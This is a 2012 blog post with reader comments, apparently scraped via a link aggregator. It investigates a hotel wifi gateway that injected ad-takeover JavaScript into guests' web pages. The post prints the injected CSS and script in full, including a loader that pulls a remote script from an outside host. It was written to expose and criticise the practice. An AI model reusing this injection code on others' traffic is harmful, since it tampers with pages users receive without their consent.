{"aid": "40155022", "title": "Hotel WiFi JavaScript Injection (2012)", "url": "https://justinsomnia.org/2012/04/hotel-wifi-javascript-injection/", "domain": "justinsomnia.org", "votes": 1, "user": "redbell", "posted_at": "2024-04-25 08:43:55", "comments": 0, "source_title": "Hotel Wifi JavaScript Injection", "source_text": "Hotel Wifi JavaScript Injection - Justinsomnia\n\nJUSTINSOMNIA\n\n# Hotel Wifi JavaScript Injection\n\nSo I\u2019m checking my blog on the hotel wifi, like ya do, and I notice something\na little off with the style. There\u2019s a dark colored bar at the top of the page\nthat shouldn\u2019t be there. That\u2019s funny. Maybe a recent Firefox update changed\nhow they treat CSS?\n\nScreenshot of Justinsomnia with weird bar circled in red\n\nI probably wouldn\u2019t have thought much of it, except my blog had recently been\nhacked (someone had gained elevated access to my web hosting account and\nprepended every single PHP file with a base64 encoded rootkit), so I\nimmediately decided to view the source. Sure enough I saw some unfamiliar CSS\nand JavaScript that had been injected after the <head> tag (reformatted here\nfor readability):\n\n    \n    \n    <style type=\"text/css\"> #rxgheader { visibility:hidden; color:#111; background:#ffffff; text-align:center; border-bottom:1px solid #666; z-index:10000; position:fixed; width:100%; top:0; } #rxgleftbar { visibility:hidden; color:#111; background:#fff; border-right:1px solid #666; z-index:10000; position:fixed; height:100%; left:0; } #rxgrightbar { visibility:hidden; color:#111; background:#fff; border-left:1px solid #666; z-index:10000; position:fixed; height:100%; right:0; } #rxgfooter { visibility:hidden; color:#111; background:#ffffff; text-align:center; border-top:1px solid #666; z-index:10000; position:fixed; width:100%; bottom:0; } #rxgcontent { } </style> <script language=\"JavaScript\" type=\"text/javascript\"> function checkVisible() { var footer, header, leftbar, rightbar, content; if (document.all) { footer = document.all.rxgfooter; header = document.all.rxgheader; leftbar = document.all.rxgleftbar; rightbar = document.all.rxgrightbar; content = document.all.rxgcontent; } else if (document.getElementById) { footer = document.getElementById('rxgfooter'); header = document.getElementById('rxgheader'); leftbar = document.getElementById('rxgleftbar'); rightbar = document.getElementById('rxgrightbar'); content = document.getElementById('rxgcontent'); } if (footer) { if (footer.offsetWidth > 600) { footer.style.visibility = 'visible'; content.style.paddingBottom = (footer.offsetHeight + 4) + \"px\"; } } if (header) { if (header.offsetWidth > 600) { header.style.visibility = 'visible'; content.style.paddingTop = (header.offsetHeight + 4) + \"px\"; } } if (leftbar) { if (leftbar.offsetHeight > 400) { leftbar.style.visibility = 'visible'; content.style.paddingLeft = (leftbar.offsetWidth + 4) + \"px\"; } } if (rightbar) { if (rightbar.offsetHeight > 400) { rightbar.style.visibility = 'visible'; content.style.paddingRight = (rightbar.offsetWidth + 4) + \"px\"; } } } </script>\n\nAnd I found some unfamiliar JavaScript after the <body> tag (also\nreformatted):\n\n    \n    \n    <div id=\"rxgheader\"> <script type='text/javascript'> var advnIsAdProviders = true; var advnIsPersistCookie = false; var mCustomerId = 44; var advnIsHideImmediately = false; var mDelayLoad = 1000; var advnAdRotationDelay = 30000; var jsUrl = 'http://adsmws.cloudapp.net/user/advnads20.js'; function addScript(jsUrl) { var AdvnScript = document.createElement('script'); AdvnScript.setAttribute('src', jsUrl); AdvnScript.setAttribute('type', 'text/javascript'); document.body.appendChild(AdvnScript); } setTimeout('addScript(jsUrl)', 50); </script> <div id = \"rxgcontent\"> <script language = \"JavaScript\" type = \"text/javascript\"> checkVisible(); </script>\n\nFor the non-web-developers reading, the most salient bits to note above are\nthe prefix \u201crxg\u201d in the CSS and the URL\nhttp://adsmws.cloudapp.net/user/advnads20.js pointing to a packed external\nJavaScript file that looked very suspicious. RXG appears to be a common\nextension used in viruses and malware, but I found very few results in Google\nhaving to do with advnads20.js or adsmws.cloudapp.net.\n\nImmediately I sshed into my webhost, and did an svn diff on my WordPress core\nfiles. No changes. Hmm, maybe someone mucked with my custom theme files (which\nare not under version control)? Nope, no dice, everything appeared kosher. It\noccurred to me to wget my blog while I was sshed into my webhost\u2019s server in\nLos Angeles\u2014to see if the changes were also showing up there. Nope. Bingo! I\nloaded Stephanie\u2019s blog and found the same symptoms in the source\u2014but she\u2019s\nhosted under my account. So just in case, I loaded Andre\u2019s blog, hosted by\nTypePad. Same thing. Verdict: somewhere between the internet and my computer,\nsomeone is injecting JavaScript into EVERY SINGLE PAGE I LOAD.\n\nI found a utility that unpacks packed JavaScript, and it only took a quick\nskim of advnads20.js (over 1900 lines reformatted) to estimate that its\nprimary purpose is ad injection/takeover. The good news is, this explains why\nall the embedded YouTube videos in Google Reader were showing up as empty\nblack squares.\n\nBut the question remains, did the hotel\u2019s wifi access point get hacked, or is\nsomething more nefarious at work? Is it possible that the hotel\u2019s internet\nservice provider is doing this on purpose? Could it be that the Courtyard\nMarriott in Times Square is actually aware of and condoning this type of bad\nbehavior?\n\nIn any case, who the heck do I report something like this to?\n\nUpdate: I really wanted to give Marriott the benefit of the doubt, but it\nturns out I was wrong. There is something more nefarious at work. Thanks to\nDanny in the comments, I learned that the \u201crxg\u201d I saw in the injected CSS and\nJavaScript is short for Revenue eXtraction Gateway, a wireless hotspot gateway\nproduct built by RG Nets, Inc., and available for sale from Wlan Mall.\n\nRG Nets RXG-A8\n\nIn short, the Courtyard Marriott is using the RXG to inject JavaScript into\nthe HTML of every webpage its hotel customers view for the purpose of\ninjecting ads (and in the meantime, breaking YouTube). Marriott\u2019s wireless\ninternet service provider is a third-party company called Hotel Internet\nServices, so it is possible, though unlikely, that Marriott doesn\u2019t know\nwhat\u2019s going on. But it\u2019s crazy to me that I\u2019m paying $368 a night for a hotel\nroom, and this is how I get treated.\n\nUpdate: I guess not all press is good press. Ronen Isaac (coincidentally of\nWlan Mall) appears to have taken down the Vimeo video (I had previously\nembedded above) that I thought did such an excellent job describing how the\nRevenue eXtraction Gateway worked.\n\n> Sorry, \u201cRGnets RXG Injection Advertising Demo\u201d was deleted at 10:17:28 Fri\n> Apr 6, 2012. We have no more information about it on our mainframe or\n> elsewhere.\n\nGood thing RG Nets still has the video up on their own site! And thanks to The\nVerge, there\u2019s now a copy of the video up on YouTube that I can embed for your\nviewing pleasure:\n\nDemo of RGnets RXG Injection Advertising\n\nHere\u2019s a transcript of the video\u2019s hypnotic, robotic voice-over:\n\n> The video demonstrates the HTML payload rewriting feature of the RG Nets\n> Revenue eXtraction Gateway. The web browser that you are looking at is that\n> of an end user that is connected to the internet through an RG Nets Revenue\n> eXtraction Gateway. The end user is running stock IE7 without any special\n> plugins or installations. All rewriting is done on the fly in the RXG. The\n> RXG is configured to rewrite all transit webpages to include a banner\n> advertisement for a BMW S1000RR motorcycle. The S1000RR banner can be\n> positioned at the top, bottom, left, or right side of webpages. In addition,\n> the banner may be rotated with other banners to simultaneously support\n> multiple advertising campaigns. Of course the banners may also be linked to\n> any website desired. As you can see the pervasive nature of the advertising\n> banner on all webpages guarantees banner advertising impressions. The RG\n> Nets RXG HTML payload rewriting feature is a tremendously powerful tool,\n> with a broad spectrum of applications for internet marketing programs.\n\nUpdate: A thought exercise: imagine the hotel delivered complementary issues\nof the New York Times to every room, except that in this case, all the ads had\nbeen cut out, some of the articles had been accidentally cut out (because they\nhappened to be on the other side of an ad), and on every single page there\u2019s a\nnew ad that\u2019s been stuck on top. How would you react? How do you think the New\nYork Times would react?\n\nUpdate: Here\u2019s a round-up of people talking about Hotel Wifi JavaScript\nInjection around the web:\n\n  * Hacker News\n  * MetaFilter\n  * Digg\n  * Reddit\n  * TechCrunch (twice!)\n  * The New York Times\u2019 Bits Blog (twice!)\n  * The Verge (twice!)\n  * The Huffington Post\u2019s Gadling Blog (twice!)\n  * heise online\n  * Boing Boing (though they didn\u2019t link to my post!)\n  * Forbes\n  * https://doesmysiteneedhttps.com/\n\nUpdate, April 9, 2012: I just received the following message from a\nrepresentative of Marriott:\n\n> As soon as we learned of the situation, we launched an investigation into\n> the matter. Preliminary findings revealed that, unbeknownst to the hotel,\n> the Internet service provider (ISP) was utilizing functionality that allowed\n> advertising to be pushed to the end user. The ISP has assured the hotel that\n> this functionality has now been disabled.\n>\n> While this is a common marketing practice with many Internet service\n> providers, Marriott does not condone this practice. At no time was data\n> security ever at risk.\u201d\n\nThough I\u2019d question the assertion that network-level JavaScript injection is a\n\u201ccommon marketing practice\u201d, I\u2019m glad they say it has been disabled. I\u2019m\ncurrently back in San Francisco, so I have no way to confirm, but I\u2019ll likely\nbe back in NYC staying at the same hotel in a month.\n\nUpdate: Something has bothered me about Marriott\u2019s official response above. I\ncompletely get that Marriott is a large sprawling corporation, and it\u2019s likely\nthat the right hand often does not know what the left hand is doing. I get\nthat. I\u2019ve worked in much smaller organizations where that has been the case.\nI also get that their response is a typical, old school public relations gloss\nover the problem\u2014without any satisfying transparency as to how the problem\ncame to be or any meaningful details about how it was ameliorated.\n\nWhat bugs me about their response is that the device required to do this type\nof on-the-fly JavaScript injection of HTML is both rare and expensive. It\nrequires specialized hardware (like the RG Nets\u2019 RXG-A8) starting at a cost of\n$10,000. In other words, this hardware was procured precisely for the purpose\nof perpetrating this kind of attack. If Courtyard/Marriott/Hotel Internet\nServices didn\u2019t want that feature, then they probably could have requisitioned\ncheaper, less specialized, and more robust networking hardware.\n\nWhich means that the optimal solution to this snafu wasn\u2019t simply that \u201cwe\u2019ve\ndisabled the functionality\u201d\u2014it has to be \u201cwe\u2019ve removed/replaced the offensive\nhardware\u201d. Nothing less is sufficient. Otherwise, what\u2019s to stop someone from\naccidentally (or otherwise) re-enabling it later?\n\nPosted on Tuesday, April 3, 2012 at 10:11pm in: Gripes, Meta, Tech\n\n# 92 Comments\n\nDanny Dawson\n\nApr 3, 2012 10:35pm\n\nReport it first to the Courtyard Marriott\u2019s tech people. If you have\ndifficulty reaching a knowledgable person there, start talking about it on\ntheir yelp page and/or twitter. Sometimes negative press is necessary to spur\naction.\n\nEither this is an intentional revenue generator by the hotel/wifi provider, or\nmore likely, their access point is hacked. It\u2019s also possible that neither of\nthese things is true and you\u2019ve connected to a rogue network set up to mimic\nofficial hotel wifi.\n\nSucks.\n\nDanny Dawson\n\nApr 3, 2012 10:53pm\n\nAlso, have you tried browsing in recent versions of Chrome? There are recent\nsecurity measures intended to check for certain kinds of SSL-related man-in-\nthe-middle attacks, e.g.\nhttp://googleonlinesecurity.blogspot.com/2011/08/update-on-attempted-man-in-\nmiddle.html\n\nIt\u2019s kind of tangential and unlikely your certs are being altered, but worth a\ncheck.\n\nDanny Dawson\n\nApr 3, 2012 10:59pm\n\nAnd finally (really here) a video explanation of the code injection you\u2019re\nseeing: http://vimeo.com/11369399\n\nAnd a reference citing that it isn\u2019t unheard of for hotels to inflict this on\nyou: http://www.ehow.com/how-does_5144622_do-wifi-hotspots-work.html\n\nI\u2019ve seen it before myself, but it\u2019s been a while.\n\njustin\n\nApr 4, 2012 10:47pm\n\nDanny, your Google-foo is stronger than mine. Heh. My blog is my negative\npress soapbox. Thanks to Google and the rarity of this issue, my post already\nowns the search results for hotel wifi javascript injection.\n\nCan you imagine the Yelp review: \u201cBeds were comfortable, but I felt violated\nby the javascript injection in their wifi...\u201d\n\nChrome (Chromium) is affected the same as Firefox.\n\njackie\n\nApr 5, 2012 8:40am\n\nAlso, where in these United States is a Courtyard Marriott $368 a night? (So I\ncan avoid going there)\n\nJS\n\nApr 5, 2012 9:01am\n\nClassic Justinsomnia post! Internet detective. And great find back to rXg,\nDanny. The Vimeo poster (where did he get that voiceover?!) links back to:\nhttp://www.wlanmall.com/ , heh.\n\nI\u2019ve seen something similar years ago at \u201cfree\u201d airport wifi but with an\niframe from the gateway that stays persistent with ads, while browsing.\n\njustin\n\nApr 5, 2012 9:33am\n\nJackie: NYC, Times Square (and that\u2019s pre-tax).\n\nJonathan: I have to say I\u2019ve never seen anything like it. It really bothered\nme\u2014what would prevent someone from installing a javascript keylogger and\ncapturing my username and passwords as I type them?\n\nNick Barnard\n\nApr 5, 2012 2:09pm\n\nHrm, I wonder if you were sue happy if you could use them for false\nadvertising. Is it still internet when you violate end-to-end?\n\njustin\n\nApr 5, 2012 2:20pm\n\nNick, I definitely feel strongly that this is very bad behavior, but for some\nreason I feel like bringing attention to the issue and shaming Marriott into\nchanging their policy is far more rewarding than figuring out some pretense to\nsue them.\n\nBrad Barrish\n\nApr 5, 2012 4:31pm\n\nMy experience with wifi on Southwest Airlines is that they do something very\nsimilar. I\u2019ve see this in other hotels in the US as well.\n\nk\n\nApr 5, 2012 5:22pm\n\nSo, this is what you have been up to since you left, schmoozing in fancy\nhotels!!\n\nConrad Damon\n\nApr 5, 2012 5:42pm\n\nWas the wifi free? I wonder if they mention anything about ads in the wifi\nterms of use. My guess is that this is very common. A good ad blocker should\nhelp.\n\nKen S\n\nApr 5, 2012 5:46pm\n\nHey Justin,\n\nI\u2019ve contacted the Marriott and they\u2019re interested in looking into the matter.\nThey\u2019re going to reach out for details.\n\nChris Wilkinson\n\nApr 5, 2012 5:49pm\n\nSo you\u2019re using a network that you don\u2019t control and you aren\u2019t using a VPN?\nNAUGHTY!\n\njustin\n\nApr 5, 2012 5:54pm\n\nConrad, the wifi was free, however the hotel room was not inexpensive. I saved\na copy of the wifi terms of sure, read the whole thing, there\u2019s nothing that\ncomes even close to \u201cwe reserve the right to modify the HTML you request en\nroute.\u201d\n\nKen S, sounds cool. I also reached out (found an email address for to Marriott\nCorporate Business Ethics group), but like I said, this is the type of issue\nnormal channels of customer support are not set up to handle.\n\nChris Wilkinson, I have to admit, I\u2019m relatively VPN-ignorant. I tend to\nassociate VPN use with big corporations. Are there inexpensive VPN solutions\navailable for private citizens?\n\nJoel\n\nApr 5, 2012 5:58pm\n\nPlease keep us informed about this. I think its abhorrent.\n\nPete\n\nApr 5, 2012 6:13pm\n\nJustin: I would recommend privatvpn.se, they have hosts in multiple countries.\n\nAlthough I am curious if VPN even would work. I feel they might block traffic\nto force you to view their ads.\n\nRyan Henson Creighton\n\nApr 5, 2012 6:24pm\n\ni\u2019ve used hotel wifi in New York City that has detected websites as i browsed\nthem, and has done redirects to quasi-lookalike sites, or sites with a similar\ntheme. Presumably, the ad revenue racked up on these sites that i was\nredirected to is split with the hotel using the service. Dirty ... especially\nsince i was paying for the wifi acces.\n\n\u2013 Ryan\n\nmiconian\n\nApr 5, 2012 6:25pm\n\nSounds like a good use case for lynx.\n\nMatt Peterson\n\nApr 5, 2012 6:31pm\n\nA VPN would work fine, because they will be using encryption, which can\u2019t be\nsnooped on or altered.\n\nGen Kanai\n\nApr 5, 2012 6:35pm\n\nI would never use a hotel network, especially a wifi network, without a VPN.\nNot only could anyone else be packet-sniffing/injecting, clearly the network\nprovider itself was inspecting your http requests and adding in js that you\ndidn\u2019t want. Sure there is the Https Everywhere Addon for Firefox but that\ndoesn\u2019t help you on non-https sites. There are many VPN services out there. I\nrecommend using one on any network that you do not know the intimate details\nof.\n\nPjones\n\nApr 5, 2012 6:38pm\n\nSo... What you\u2019re saying is that the ISP was distributing a unlicensed\nderivative work of every web page you visited?\n\nChris Wilkinson\n\nApr 5, 2012 6:40pm\n\nJustin, I use the \u201cUltimate\u201d service from http://www.acevpn.com and it\u2019s\nexactly what you should be using. They provide multiple servers in different\nlocations. The service is through OpenVPN so you can connect easily from Mac,\nWindows and Linux. Looks like you\u2019re running Ubuntu??\n\nGen Kanai\n\nApr 5, 2012 6:43pm\n\nLet me also recommend the Ghostery Addon for Firefox/Chrome which can block\ncookies as well as 3rd party tracking beacons as well as those 1 pixel\ntrackers by site/url if needed. When you see how all of these sites track you\non the Internet, it\u2019s staggering. I block as many as I can without totally\ndegrading my Internet experience.\n\nMozilla\u2019s Collusion addon provides a graphic visualization of the trackers in\nreal-time.\n\nhttps://www.mozilla.org/en-US/collusion/\n\n(Full disclosure, I work for Mozilla but not on Collusion.)\n\njustin\n\nApr 5, 2012 7:00pm\n\nPjones, yeah, I guess you could say so. ;) But not only that, if you look at\nthe JavaScript they\u2019re injecting, they appear to also be replacing or blocking\nhundreds of other ad providers. And worst of all, the code breaks YouTube!\n\nPete and Chris Wilkinson, thanks for the VPN info. I\u2019ll take a closer look.\nYes, I\u2019m using Ubuntu Natty.\n\nGen Kanai, thanks for the comments. Ghostery has come up on several occasions\nlately. I\u2019ll have to check out Collusion as well.\n\nGen Kanai\n\nApr 5, 2012 7:07pm\n\nI\u2019ve posted this to MetaFilter.\n\nhttp://www.metafilter.com/114585/Courtyard-Marriott-in-Times-Square-is-spying-\non-and-manipulating-your-Internet\n\nPhil\n\nApr 5, 2012 7:11pm\n\nGood post, thank you Justin, very useful.\n\nHenry L\n\nApr 5, 2012 7:46pm\n\nI am a co-founder at a startup that does advertising on WiFi networks. We only\nrun advertising before you connect (when you are in a captive portal), without\nthe use of proxying.\n\nBefore anyone overreacts to this article, it would be beneficial to understand\nthe hospitality space. The hotel you stayed at is most likely owned by a\nfranchise group and operated by a GM. GMs are responsible for contracting\ntheir own networking services with Hotel WiFi Operators such as the one\nmentioned here. As such, a major hotel brand such as Marriott may use hundreds\nof WiFi operators. WiFi operators range in size, managing anywhere between one\nproperty to tens of thousands. The vast majority of these operators do not\nleverage javascript injection.\n\nThe ones that resort to proxied ad injection do so because hotel IT is a thin-\nmargin business. WiFi is considered a cost center but is tolerated because it\nis the number one amenity requested by guests. Operators will sometimes offer\na discounted service fee to the hotel GM in exchange for mid-stream ads,\nalthough, in this case, it is just as likely that the hotel GM is unaware of\nthis. It is almost absolutely certain that Marriott is unaware of this. Even\nif they were made aware, the power balance between the brand and the\nfranchisee is not clearly defined with regards to WiFi.\n\nAs much as I dislike ad injection, it is important to note that public WiFi is\nnever safe unless you are using a VPN. It is offered as an amenity, one that\nGMs would be more than happy to get rid of if they could. Unlike with your\nbroadband ISP, you have logged into a privately operated network. You are\nprobably not paying for it. You are subject to their rules. Furthermore, when\nyou signed onto the WiFi network, you most likely had to check a checkbox\nindicating your agreement to the terms of their network (which no one ever\nreads). As such, caveat emptor, etc.\n\nFanboy\n\nApr 5, 2012 8:00pm\n\nI\u2019ve added the following filter..\n\nhttps://hg.fanboy.co.nz/rev/35eaae9134b6\n\nLemme know if that helps with those adverts :)\n\nhttp://www.fanboy.co.nz\n\nMike\n\nApr 5, 2012 8:42pm\n\nTurn on SSL =)\n\nChris Rogers\n\nApr 5, 2012 10:11pm\n\nI\u2019ll bet if you find an amazon link somewhere you will find it contains a\nfresh affiliate id attached to this RG Nets company\n\nAlex\n\nApr 5, 2012 10:14pm\n\nAnd this is why you always tunnel your entire computer\u2019s traffic through a VPN\nor SSH tunnel. Sidestep is great on the MAC, OpenVPN is great on Windows.\n\njustin\n\nApr 5, 2012 10:26pm\n\nHenry L, I appreciate your response, and I understand where you\u2019re coming\nfrom, though I think you\u2019re being defensive. Just so you know where I\u2019m coming\nfrom, I\u2019m not opposed to online advertising. I spent 4 years working for\nFederated Media, which placed generally high-CPM advertising on blogs.\n\nHowever I think JavaScript injection is plain wrong. If not criminal.\n\nSo it doesn\u2019t matter if hotel IT has thin margins (or zero-margins) or a major\nhotel brand uses hundreds of WiFi operators. Being unaware of what is going on\nin your business is no excuse. Marriott has substantial documentation online\nabout their corporate responsibility and business values. I have no doubt that\nthis is an isolated mistake or an oversight or a very bad decision, but I have\nno misgivings for calling them out on it.\n\nI would add that calling public wifi \u201cnever safe\u201d is also no excuse. Sure,\nmany corporate business guests will use VPN for access to sensitive\nsystems/data, but very few average people know about VPNs, and frankly they\nshouldn\u2019t have to for non-sensitive, non-HTTPS web browsing at what is\neffectively a tourist hotel in Times Square. You should be able to read the\nnews or check your blogs or watch a YouTube video without your hotel running\ncraptastic regular expressions over your HTML. End of story.\n\nmatt johnson\n\nApr 5, 2012 10:26pm\n\nGo fanboy go! ! Flight fire witth fire! If you have not used the ad blocker\nfilter list from fanboy yet, it\u2019s time to try it.\n\nHenry L\n\nApr 5, 2012 10:35pm\n\nJustin, I didn\u2019t mean to come across as defensive. I have no reason to be\nsince my company does not engage in this type of advertising. I also don\u2019t\ncondone this. I stand by my comment because I want to bring another\nperspective to this article.\n\nDenverite\n\nApr 5, 2012 10:38pm\n\nSo I thought I\u2019d interject something here. Being a hotel professional who also\nhandles IT for a mid-range hotel in a major market I can tell you that there\nare a lot of variables that come into play when you talk about hotel internet.\nFirst and foremost there is the question whether the hotel is privately or\ncorporately owned. If its privately owned the hotel can opt into products that\nMarriott does not necessarily have much control over. The situation can then\ndevolve to a cost portion and if the HSIA ISP is inserting its own JavaScript\nit could be that they intend to insert ads and lower cost to the hotel even\nmore. 9 times out of 10 the hotel staff will not understand what you mean when\nyou talk about this kind of thing so you need to make sure you talk to a\nGeneral Manager or IT individual within the company. If you complain to\nCorporate make sure you do it to say the President\u2019s office rather than Guest\nAssistance because they\u2019ll have no clue either. Just some suggestions\n\njustin\n\nApr 5, 2012 11:32pm\n\nDenverite, yeah, can you imagine me going to the front desk and complaining\nabout javascript injection? Or even calling customer support? I tried to find\na corporate contact online, but they don\u2019t make it easy. Apparently a friend\nof mine (Ken S) got in touch with someone via Twitter, so maybe they\u2019ll reach\nout to me tomorrow.\n\nmichel v\n\nApr 5, 2012 11:51pm\n\n\u201cWiFi is considered a cost center\u201d\n\nSo are washing towels and changing bed sheets, yet in a $300+ room one would\nexpect these services to be included. And these services alone cost several\ntimes what WiFi access costs. Talk about \u201ccost centers\u201d.\n\nMichael\n\nApr 6, 2012 2:45am\n\nYup, I\u2019ve seen a version of this sort of thing when using wi-fi at the\nImperial Palace in Las Vegas. Noticed similar items as did you, though in my\ncase it was more than an additional odd line...it was an entire in-window\ntoolbar, which of course seemed to cripple both Chrome and Safari.\n\nA little digging revealed it was the \u201cr66t bar\u201d supplied by\nhttp://www.r66t.com/. Same sort of thing; ad injection and tracking. To add\nfurther insult to injury, I was actually paying $20/day for this luxurious\ninternet service; it wasn\u2019t even free with the room.\n\nIn my simpleton\u2019s view of life...if a company, be it the hotel or the wifi\nprovider, can\u2019t do business in a clear and up-front manner...there\u2019s usually a\nreason for it.\n\nPerry\n\nApr 6, 2012 3:14am\n\nThis is a really interesting Blog post \u2013 Nice job.\n\nI\u2019m a gold Marriott member, and I recently stayed in a (Marriott) SpringHill\nSuites in CO Springs, where they had tiered IBAHN internet service \u2013 around\n350K was free, and it was $10/day for higher. The free speed was basically\nunusable except for what it was advertised at \u201cchecking email, casual surfing\u201d\n\u2013 even picking airplane seats for check-in was unbelievably slow. I didn\u2019t pay\nfor the upgrade, but will in the future \u2013 if I can\u2019t find a hotel with free\n(fast) internet.\n\nYes, changing HTML is even worse, obviously hotels and their providers are\ngetting wise to using HS internet to get more money out of us. I do fully\nexpect that demand is rapidly outstripping the hardware they have for room\nconnectivity \u2013 how many of us have more than 1-2-3 internet devices now? And\nNetflix is a human right?\n\nThat and your blog post is my excuse to finally get my company to pay for\ninternet tethering.\n\nI am going to squalk at the dumb tiered service to Marriott corporate, and\nI\u2019ll keep my eyes open for RXG.\n\nadrian\n\nApr 6, 2012 4:52am\n\nthe domain cloudapp.net is azure. you can contact M$ and tell them that their\nhosting is used for this type of hacks. It\u2019s in their privacy policy so they\nneed to terminate and take legal action against the owner.\n\nThey will probably also find out that the account was payed with a stolen\ncredit card and report that ... further up the chain.\n\nThanks for reporting this.\n\nMike\n\nApr 6, 2012 5:36am\n\nIf its free, then one usually has to go with whatever hotel provides\n(including ads); unless consumers can demand better ad-free service or find\nanother hotel chain who has not yet started exploiting generating revenue\nthrough internet ads (or saving on cost ...whatever). And as usual hotel\nguests would be accepting the lengthy internet agreements.\n\nDunno how far one is going by javascript injection. Am not saying its right or\nwrong about javascript content injection. Just for discussion sake, if user\ncomputer allows it then maybe nothing wrong in doing it (like a webpage\nshowing ads, someone could say why is someone injecting ads on my laptop\nscreen... Content injection can happen through various means, java script is\none way either user could disable JS all together, it if works or have to live\nwith it since without that internet service may not work). On contrary one\ncould argue even if user computer is less secure and someone can hack into it,\nhacking is not legal.\n\nSo this might fall into gray area.\n\nSpeaking about ethics, if its not illegal then there is nothing ethical or\nunethical. Everything is treated as legal or illegal, and then there is\ncustomers business which can be leveraged to get what one wants (I will take\nmy business to someone else if you are not changing your xyz service).\n\nEither we consumers show supplier (hotels) that customer is the king and get\nconsumers demands met or we just have to live with it.\n\nAnd finally a very bad service, if the customer pays for internet service and\nis still getting same ad enabled internet service like customers with free\ninternet.\n\nI fall in the category of free internet user, if its not free I am not paying\nit (dont want to give you internet revenue, either have it built in room cost\nor make it complimentary). And if its not free, I just take a break from\ninternet (anyways hotels are meant to be for resting, but alas we take our\nwork everywhere and we love the internet so much that not having is like ....\n:)\n\nAnd its just a discussion and random thoughts\n\nNick Douglas\n\nApr 6, 2012 7:26am\n\nJust wanted to give you props for pointing this stuff out \u2014 casual users like\nme, lacking the knowledge to investigate this sort of trickery (but savvy\nenough to want it gone), rely on people like you as a kind of consumer\nadvocate. So thank you!\n\ninactivist\n\nApr 6, 2012 8:07am\n\nIf you can SSH through the WiFi, why not set up a SOCKS5 proxy through your\nserver, and browse/email through the proxy? I would :D\n\njustin\n\nApr 6, 2012 9:09am\n\nMichael, is it just me, or does R66T connote \u201croot\u201d as in \u201cbeing rooted\u201d more\nthan Route 66?\n\nPerry, thanks. The funny thing is that in my case, the wifi was complimentary,\nthere was nothing mentioned in the end user agreement about ad injection, and\nthere was no option to upgrade or pay for faster/better/ad-free service.\n\nAdrian, if you or anyone has suggestions about how to contact Microsoft about\nthis let me know.\n\nMike, I pretty much disagree with your entire comment. Just because an addon\nservice is \u201cfree\u201d (nothing is free, the room was not free), does not mean it\nhas to be adulterated. Just because a computer might be insecure to man-in-\nthe-middle attacks does not make hacking legal. (If I leave my door unlocked,\ndoes that make it legal for you to steal my stuff?) There is a whole world of\nlegal actions that are unethical: case in point all the political ethics\nviolations we read about in the news. Ethics are about rightness and\nwrongness. Legality is about whether something is restricted by law.\n\nNick, you\u2019re welcome. I\u2019m surprised how much this has attracted popular\nattention. I should have known: internet users don\u2019t like their internet being\nadulterated.\n\ninactivist, I was sshing into my webhost\u2019s shared server. Not sure I could set\nup a SOCKS5 proxy in that case. I\u2019m a fairly technical user, but this episode\nhas convinced me that there\u2019s a market need for a VPN/proxy solution for\naverage users.\n\nB\n\nApr 6, 2012 9:47am\n\nGreat find; I hope this blows up. Found you via Metafilter. WiFi is no more\nexpensive to run for a hotel than it is for any business, which is to say,\npractically free. I have done it. Even with terribly expensive APs and\ncontrollers, it\u2019s a one time expense in the low thousands. This hijacking and\njavascript insertion nonsense is inexcusable, particularly from a huge chain.\n\nAnswer: leech nearby WiFi or, better, tether your phone. Chances are you\u2019d\nhave no fun at all trying to establish VPN connectivity behind various\ndifferent hotel firewalls and proxies....\n\nTodd\n\nApr 6, 2012 10:15am\n\nSounds like a good reason to run a secure (ssl) proxy server at your home and\nuse that from the hotel. Presumably that would be safe.\n\nzomg\n\nApr 6, 2012 11:43am\n\nOut of curiosity, did you try this with the NoScript Firefox plugin? I suppose\nit wouldn\u2019t stop the injection, but it would stop scripts from doing things\nthat break YouTube, etc. I like NoScript because it is really easy to permit\nor forbid scripts on a host-by-host basis, etc.\n\njustin\n\nApr 6, 2012 11:58am\n\nzomg, no, because their injection never resulted in an ad being display. I\nsuppose if I had to watch a YouTube video for work purposes (this was a\nbusiness trip) I would have been more pissed, and tried some active\ncountermeasures (edit /etc/hosts, etc.)\n\nJohn G\n\nApr 6, 2012 12:22pm\n\nThe more interesting part of this is when residential neighbors jump on\n\u2018unsecure\u2019 wifi and the same business model is at work. http://www.dd-\nwrt.com/site/index The hotel setup is pretty common in hotels and I don\u2019t\nconsider it as devilish as you suggest. Hotels have to go shopping for some\nkind of captive gateway. They can\u2019t just open up their wifi nor can they hand\nout pass words or whitelist MAC addresses. The captive gateway is their\nsolution and the hardware sellers sweeten the deal by offering hotels\ndifferent ways to recoup the cost of their ISP through ad replacement or first\npage ads. We already know that the hotel is a business. They are trying to\nmake money off of you.\n\njustin\n\nApr 6, 2012 1:22pm\n\nJohn G, I have to restrain myself from writing this in all caps: they are\nalready making money off of me. I paid $368/night for several nights. That\u2019s\nan excellent \u201ccaptive\u201d way for them to recoup their costs. What do you think?\n\nStephanie\n\nApr 6, 2012 1:26pm\n\nJohn G \u2013 I agree that hotels are businesses and why not leverage some income\nvia some sort of advertising channel, especially when offering \u201cfree\u201d wifi?\nBut they need to be upfront about it. Make it obvious. There are several ways\nthey could do that. But they should never replace advertising on sites that\nwould otherwise benefit from that view/impression and re-route to their own\nbenefit. That\u2019s 100% wrong.\n\nWho\u2019s the ad provider anyway? That\u2019s what I want to know.\n\nMichael P\n\nApr 6, 2012 8:18pm\n\nJustin, amazing find!\n\nI find myself at the Imperial Palace in Las Vegas and had to check it out.\n\nHowever, instead of the r66t stuff mentioned previously, I find the exact same\nstuff that\u2019s in your blog. I would bet that RG Nets gateway was inserting the\nr66t stuff too, and the hotel just changed ad providers.\n\nThe Imperial Palace isn\u2019t associated with Marriott at all are they?\n\nI also checked youtube, and that appears to work here.\n\nanon\n\nApr 6, 2012 8:31pm\n\nA little bit of googling and look what I have found... looks like these RG\nNets folks have been at this for years:\n\nhttp://www.dslreports.com/forum/r22305075-complaint-Stop-surving-fake-scanners\n\nLook at the screenshot of the ad. It says ... \u201cExert control over, clearly\ncommunicate with and have complete cognizance over your end-user population.\u201d\nWTF?\n\nHey Justin are you still at the hotel? Can you check your ARP table. I want to\nknow what the MAC address of the default gateway is. Check this out:\n\nhttp://standards.ieee.org/develop/regauth/oui/public.html\n\nIf you search for RG Nets there you will find that they have only a single\nblock of MAC addresses.\n\n    \n    \n    00-23-FA (hex) RG Nets, Inc. 0023FA (base 16) RG Nets, Inc. 1000 E. William Street Suite 204 Carson City NV 89701 UNITED STATES\n\nI want to see if the MAC address of the default gateway at the hotel is in\nthat range. If this RXG thing is an appliance and if the MAC you have is in\nthat range we know there can\u2019t be all that many of them out there because they\nonly have a single 